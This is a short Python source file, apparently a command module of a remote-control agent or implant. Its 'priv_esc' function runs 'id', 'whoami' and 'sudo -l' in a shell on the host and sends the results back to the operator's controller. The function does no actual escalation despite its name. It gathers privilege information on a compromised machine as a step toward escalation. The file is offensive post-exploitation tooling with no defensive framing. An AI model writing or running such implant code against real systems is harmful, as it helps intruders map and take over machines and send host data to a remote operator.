    # igider/agent_code/priv_esc.py
    import os
    import json
    import subprocess

    def priv_esc(self, task_id, method="basic"):
        """
        Attempt privilege escalation on the host machine.
        """
        try:
            if method == "basic":
                result = subprocess.check_output("id && whoami && sudo -l", shell=True).decode()
            else:
                result = f"Unknown method: {method}"
            
            return self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "user_output": result,
                    "completed": True
                }]
            })

        except Exception as e:
            return self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "user_output": str(e),
                    "completed": True,
                    "status": "error"
                }]
            })
